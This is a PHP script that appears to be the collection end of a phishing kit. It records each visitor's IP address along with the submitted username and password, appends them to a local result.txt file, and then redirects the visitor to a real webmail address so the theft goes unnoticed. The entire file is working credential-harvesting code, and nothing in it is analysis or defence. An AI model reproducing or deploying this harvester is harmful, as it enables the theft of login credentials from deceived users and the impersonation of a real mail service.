<?php 
function getip() {
	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) {
		$ip = getenv("HTTP_CLIENT_IP");
	} else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) {
		$ip = getenv("HTTP_X_FORWARDED_FOR");
	} else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) {
		$ip = getenv("REMOTE_ADDR");
	} else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) {
		$ip = $_SERVER['REMOTE_ADDR'];
	} else {
		$ip = "unknown";
	}
	return $ip;
}
$ip = getip();
if (isset($_POST['username']) && isset($_POST['password'])) {
	$username = $_POST['username'];
	$password = $_POST['password'];
} else {
	$username = $_POST['uid'];
	$password = $_POST['password'];
}
$handle = fopen('result.txt', 'ab+');
fwrite($handle, date("Y-m-d H:i:s") . "\t" . 'IP:' . $ip . "\t" . '账号:' . $username . "\t" . '密码:' . $password . "\r\n");
fclose($handle);
date_default_timezone_set("Asia/Shanghai");
//重定向百度
$url = "https://mail.tingtong.com.cn/"; 
if (isset($url)) 
{ 
Header("Location: $url"); 
} 
// echo "<script>window.location.href=\"./alert.html\";</script>";
exit;